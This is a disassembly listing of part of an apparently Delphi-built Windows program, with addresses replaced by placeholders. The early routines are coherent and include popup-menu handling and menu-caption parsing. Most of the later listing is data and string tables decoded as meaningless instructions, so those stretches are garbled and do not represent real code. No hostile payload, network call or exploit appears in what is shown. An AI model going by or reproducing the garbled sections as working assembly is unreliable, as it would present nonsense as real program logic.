je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_45c734
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46c128
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_4034a4
mov edx eax
jmp r-xdata
sub_46197c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_41725c
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_4618e8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_45fcf0
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_4601ec
mov eax [ ebx + 0x34 ]
call sub_45d594
mov eax ebx
call sub_460b94
mov eax ebx
call sub_461930
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_45d6c4
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_461a30
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188d4
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_4188d4
cmp ebp [ eax ]
jne r-xdata
sub_461a6c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424c70
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_4244a4
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_424c70
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_4244a4
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_4034a4
mov edx [ r-xdata ]
call sub_403434
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_424c70
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_4244a4
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_461b54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_40408c
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_4042f8
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_404598
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_4042f8
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_404598
jmp r-xdata
sub_461be8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_404038
mov ebx 0x1
mov eax esi
call sub_4042f8
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404220
sub_461c4c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_461ca5
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_461b54
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_461b54
mov eax [ ebp - 0x8 ]
pop edx
call sub_408144
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461cac
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
sub_461cb4
adc al [ eax ]
add [ eax ] al
xor [ esi ] bh
dec ecx
add [ ecx + eax * 2 + 0x3e2c0049 ] dh
dec ecx
add [ ecx + eax * 2 + 0x49 ] bl
add [ eax ] ch
dec ecx
add ah dh
inc eax
dec ecx
add [ esi + edi ] ah
dec ecx
add [ eax ] bh
inc ecx
dec ecx
add [ eax ] ah
dec ecx
add [ esp + eax * 2 + 0x49 ] dh
add [ esi + edi ] bl
dec ecx
add [ eax + 0x41 ] al
dec ecx
add [ eax ] bl
dec ecx
add al ch
inc edx
dec ecx
add [ esi + edi ] dl
dec ecx
add [ eax + 0x42 ] bl
dec ecx
add [ eax ] dl
dec ecx
add [ eax * 2 + 0x3e0c0049 ] cl
dec ecx
add [ eax ] cl
inc ebp
dec ecx
add [ eax ] cl
dec ecx
add [ edx + eax * 2 ] al
dec ecx
add [ esi + edi ] al
dec ecx
add al al
inc esp
dec ecx
add [ eax ] al
dec ecx
add [ esp + eax * 2 + 0x49 ] bh
add ah bh
cmp eax 0x45600049
dec ecx
add al bh
cmp eax 0x45280049
dec ecx
add ah dh
cmp eax 0x42140049
dec ecx
add al dh
cmp eax 0x42280049
dec ecx
add ah ch
cmp eax 0x42740049
dec ecx
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_461dac
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461db3
retn
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
call sub_4032a8
mov eax [ rw-data ]
call sub_4032a8
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404aec
mov eax rw-data
call sub_404038
sub_461db8
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_461cb4
call sub_403de4
mov eax [ r-xdata ]
call sub_417f08
mov eax [ r-xdata ]
call sub_417fa8
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417f54
mov eax [ r-xdata ]
call sub_417e4c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c35c
mov [ rw-data ] eax
sub_46219f
add [ edx + eax ] bl
add [ eax ] al
jo r-xdata
imul esp [ edx + 0x6c ] r-xdata
cmp [ ecx ] ah
inc esi
add [ ebx ] al
or al 0x54
inc esp
add ah cl
push ss
inc edx
add ah bh
xor al 0x40
add [ eax + edx ] cl
inc edx
add [ esi + 0xc300040 ] al
inc ebp
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax ] bh
dec edi
inc esi
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ecx ] dh
inc esi
add [ eax ] cl
ja r-xdata
cmp eax [ ebp ]
clc
add eax [ ebp ]
and al 0x8f
inc ecx
add [ eax + 0x1c0044e9 ] al
mov ebp 0xf0ac0044
inc esp
add [ esi + eax * 8 + 0x44 ] bl
dec esi
outsd
jb r-xdata
add al dl
popad
insb
or esi [ edi + 0x73 ]
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
or esi [ fs : edi + 0x73 ]
dec ebp
popad
js r-xdata
add ah ah
push ss
sbb al 0xbd
inc esp
add [ eax + esi * 8 - 0x39a3ffbc ] ch
inc esp
insd
imul edi [ edx + 0x65 ] 0x6f460564
jb r-xdata
inc edx
add [ eax - 0x4fffbded ] bh
adc eax [ edx ]
in al dx
push ss
inc edx
add al al
dec esi
inc esi
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
xor [ ecx ] 0x45
add [ eax - 0x27ffbad2 ] bl
mov edx 0xbadc0044
inc esp
add [ eax - 0x15 ] dl
inc esp
add [ ebx + ebp * 8 + 0x44 ] bh
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax + 0x48 ] 0x5c0044c7
0x44
jae r-xdata
push edi
imul ebp [ esi + 0x64 ] 0x7453776f
popad
je r-xdata
or [ edx + esi * 2 + 0x61 ] dl
arpl [ ebx + 0x69 ] bp
outsb
add [ bx + si ] dl
inc eax
add [ eax + eax ] bl
add bh bh
xchg esp eax
dec esp
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x8d656c62
inc eax
add [ eax ] bh
and [ esi ] eax
add ecx [ esp + edx * 2 ]
ror al 0x21
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
and al [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
and al [ esi ]
retn 0x4622
sub_46230e
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
jae r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
dec eax
outsd
outsd
insb
push edi
imul ebp [ esi + 0x64 ] 0x620d776f
jae r-xdata
jae r-xdata
pop ds
inc esi
add [ edx + eax ] cl
add bh bh
mov [ ecx + 0x46 ] ss
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x560d000c ] al
jb r-xdata
push ds
0xa34de72b 0xcc30
imul edi [ edx + 0x65 ] 0x6c6f6f54
push ebx
outsd
outsb
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
or [ gs : edx + 0x73 ] ah
push ebx
imul ebp [ esi + 0x67 ] 0x620a656c
jae r-xdata
inc edx
outsd
jb r-xdata
and eax [ esi ]
add ecx [ esp + edx * 2 ]
lea eax [ eax ]
dec esp
and al 0x46
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x46 ] dl
add [ 0x6d726f46 ] al
jb r-xdata
imul edi [ edx + 0x65 ] 0x656c6261
or [ edx + 0x73 ] ah
inc esp
imul esp [ ecx + 0x6c ] 0x620c676f
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
jb r-xdata
jpe r-xdata
and eax [ esi ]
add edx [ eax ]
push esp
inc esi
outsd
jb r-xdata
outsb
jne r-xdata
push ebx
je r-xdata
add eax 0x54000000
inc eax
add al ch
and eax [ esi ]
prefetchw [ ecx + 0x44 ]
jae r-xdata
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
jae r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax + 0xc004624 ] bl
jae r-xdata
or [ ecx + 0x4f ] cl
insb
inc esi
je r-xdata
push edi
imul ebp [ esi + 0x5 ] 0x6d726f46
push esp
outsd
outsd
insb
inc edx
outsd
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x24 ] cl
inc esi
add [ eax ] cl
jae r-xdata
add [ eax ] eax
outsb
jb r-xdata
insb
je r-xdata
add [ ebx ] al
dec [ ebp + 0x244c0040 ]
inc esi
add bh bh
insd
and al 0x11
jb r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
outsd
jb r-xdata
inc esi
outsd
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
insd
dec ebp
outsd
jb r-xdata
inc eax
add [ esp + 0xb030046 ] bl
push esp
inc edx
outsd
jb r-xdata
je r-xdata
push cs
jo r-xdata
mov eax eax
in al dx
and al 0x46
inc esi
outsd
jb r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
add [ eax ] al
add [ ebp + 0x64090046 ] bl
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
mov al [ 0x3004625 ]
andps xmm0 [ ebp + 0x66 ]
je r-xdata
push eax
outsd
jae r-xdata
jb r-xdata
inc eax
add [ ecx ] al
jae r-xdata
outsd
imul esp [ esi + ebp * 2 - 0x5afeffbf ] 0x1d
inc ebx
lea eax [ eax ]
call 0xf466a0c
or eax 0x73654449
imul esp [ edi + 0x6e ] 0x6f487265
and eax [ esi ]
push es
bound esi [ ebx + 0x4e ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ 0x54000000 ] al
outsd
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
insd
inc esp
jae r-xdata
add [ eax ] al
add eax [ eax ]
add [ eax ] al
pushfd
and eax 0x64090046
inc esp
popa
jne r-xdata
jb r-xdata
insb
jns r-xdata
jae r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
imul edi [ edx + 0x65 ] 0x796c6e4f
push cs
je r-xdata
popad
je r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
add [ esi ] al
or al 0x54
shr ah 0x24
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
nop
inc esi
outsd
jb r-xdata
jae r-xdata
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esi
outsd
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] al
and eax 0x700a0046
outsd
inc esp
jae r-xdata
push es
add eax 0x6d726f46
jae r-xdata
insd
popad
jb r-xdata
adc [ eax + 0x6f ] dh
jo r-xdata
and al 0x46
add [ eax + r-xdata ] dl
add ecx [ ecx ]
cwde
popad
dec ebp
je r-xdata
inc esi
jns r-xdata
outsd
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
cmp al 0x26
inc esi
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
inc ebx
insb
outsd
inc ebp
jbe r-xdata
jae r-xdata
jo r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
jo r-xdata
arpl [ ecx + 0x6c ] sp
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al dh
inc ebx
outsb
je r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
and eax 0x70060046
outsd
dec esi
outsd
outsb
push cs
inc eax
add [ esi + 0xb080046 ] al
push esp
and eax 0xb030046
add [ esi ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
cmp [ esi ] ah
inc esi
inc esp
jae r-xdata
jb r-xdata
jo r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
inc ebp
jbe r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] bh
inc esi
add [ ebp + 0x26c80040 ] cl
inc esi
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] al
inc eax
add [ eax ] al
adc [ eax ] al
nop
or al 0x27
inc esi
add [ eax ] cl
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
jb r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] bh
inc esi
jb r-xdata
add eax 0x6d726f46
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jb r-xdata
lea eax [ eax ]
pushfd
and al 0x46
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
inc esi
outsd
jb r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
outsd
outsd
insb
jl r-xdata
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
push 0x3c004010
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp + 0x27ec0040 ] cl
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
push esp
and eax 0xf030046
push esp
push eax
dec edi
ja r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
push esp
and eax 0x9030046
jae r-xdata
sar [ ebx ] 0x1
inc ebp
add [ eax ] cl
pushad
inc esi
add [ edi + ecx * 4 ] ah
inc ecx
add [ eax + 0x5c ] bl
inc esi
add [ esp + ebx * 2 + 0x5da00046 ] dl
inc esi
add [ esi + eax * 8 + 0x44 ] bl
add ah ah
push ss
inc edx
add [ eax ] bl
inc si
add [ eax - 0x47ffbded ] dh
mov eax [ 0x56f00046 ]
inc esi
add ah ah
inc ebp
add [ eax ] al
cmp al 0x45
add [ ebx + edi + 0x45 ] cl
add [ eax + 0x600044bb ] dl
xor [ ebp ] eax
clc
inc esi
add al bh
add al [ eax ]
add [ ecx + 0x46 ] bh
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
sub [ esi ] al
test [ edx ] ch
inc esi
add [ eax ] al
add [ eax ] al
cmp al 0x10
inc eax
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
in al dx
daa
jbe r-xdata
cmp eax [ ebp ]
or [ eax + 0x46 ] ah
add al dl
add ah cl
push ss
inc edx
add [ eax + ebx * 2 + 0x46 ] bh
add [ eax ] dh
pop edx
inc esi
inc esi
pop es
dec ecx
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsb
je r-xdata
jo r-xdata
inc ebp
jbe r-xdata
add [ eax ] al
jae r-xdata
jb r-xdata
adc [ eax + 0x6f ] esi
bound eax [ esi ]
cwde
inc ebp
add al bl
mov edx 0xbadc0044
inc esp
add ah ch
arpl [ esi ] ax
jl r-xdata
inc esp
add [ esi + eax * 8 + 0x44 ] al
add [ esp + edi * 4 + 0x44 ] dl
add al dl
mov [ eax + eax - 0x20 ] 0xac004665
inc esi
add [ eax ] cl
leave
inc esp
add [ eax + 0x66 ] bl
inc esi
add [ eax ] al
in al dx
inc esp
add ah ch
inc ebp
add [ eax - 0x5bffbad1 ] ch
sub al [ ebp ]
mov [ edi ] gs
inc ebp
add al dh
push ebp
inc esi
add ah bh
insb
inc esi
add [ eax + 0x5 ] bl
inc ebp
add al al
jns r-xdata
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ edx ] al
sub [ esi ] eax
jb r-xdata
outsb
je r-xdata
add [ esi + 0x7e9c0040 ] al
inc esi
add [ eax + 0x32 ] al
inc eax
add [ edx + esi + 0x40 ] bl
add [ eax - 0x2fffb9a6 ] bl
xor [ edx + 0x46 ] bl
jb r-xdata
outsd
inc esi
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
add [ eax ] al
add [ eax ] al
adc [ eax ] al
dec eax
daa
inc esi
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
outsb
je r-xdata
insd
outsd
pop eax
inc esi
add [ ecx + ebx * 4 + 0x46 ] al
add [ eax ] ah
jge r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax + eax * 4 ] ah
inc esi
add al bh
cdq
add ah bl
jpo r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
0x65dc0046 0x46
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] dl
add [ eax ] al
in al 0x23
inc esi
add [ eax + 0x2 ] dl
add [ eax ] al
sbb [ esi + eax * 2 ] ah
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ esi ] 0xf8
inc esi
add al dh
add eax 0x5f40045
inc ebp
add [ eax + 0x7e ] bl
inc esi
add [ esp + eax + 0x45 ] dl
add ah cl
xor [ ebp ] al
dec esp
test [ esi ] eax
rol [ edx + 0x45 ] 0x0
dec eax
sub eax 0x9a600045
inc esi
add ah ah
dec edi
inc esi
add [ edx + edx * 2 - 0x74bfffba ] dl
inc esi
add [ ebx + ebx * 2 + 0x46 ] bh
add al bh
pop ebx
inc esi
add [ eax - 0x62 ] al
inc esi
add [ eax + ebx * 2 - 0x66bbffba ] dh
sub_462407
inc ebp
std
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
invd
dec ecx
dec edi
insb
inc esi
add bh bh
dec [ ebx + 0x46241cc0 ]
add [ edi ] cl
or [ ecx + 0x4f ] cl
insd
and al 0x11
inc eax
add [ ecx ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
outsd
jb r-xdata
outsd
jb r-xdata
inc eax
add [ esp + 0xb030046 ] bl
push esp
inc edx
outsd
add [ ebx ] al
add [ eax ] al
add [ eax + 0xc004624 ] bl
jae r-xdata
push eax
outsd
jae r-xdata
jb r-xdata
insb
je r-xdata
dec [ ebp + 0x244c0040 ]
inc esi
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
add bh bh
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
adc [ eax + 0x6f ] esi
jo r-xdata
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
insd
dec ebp
outsb
jne r-xdata
push ebx
je r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] al
and eax 0x700a0046
outsd
inc esp
jae r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
add [ eax ] al
add [ ebp + 0x64090046 ] bl
je r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
jne r-xdata
mov al [ 0x3004625 ]
andps xmm0 [ ebp + 0x66 ]
je r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + 0x24 ] cl
inc esi
add [ eax ] cl
jae r-xdata
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
inc esi
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
imul edi [ edx + 0x65 ] 0x796c6e4f
push cs
je r-xdata
popad
je r-xdata
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
jo r-xdata
and eax 0x70060046
outsd
dec esi
outsd
outsb
push cs
inc eax
add [ esi + 0xb080046 ] al
push esp
and eax 0xb030046
add eax 0x6d726f46
jo r-xdata
arpl [ ecx + 0x6c ] sp
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al dh
inc ebx
outsb
je r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
push cs
jo r-xdata
and al 0x46
add [ eax + r-xdata ] dl
add ecx [ ecx ]
cwde
nop
inc esi
outsd
jb r-xdata
jae r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
outsd
mov eax eax
in al dx
and al 0x46
inc esi
outsd
jb r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
inc ebx
insb
outsd
inc ebp
jbe r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
jae r-xdata
push esp
and eax 0xf030046
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
insd
popad
jb r-xdata
popad
dec ebp
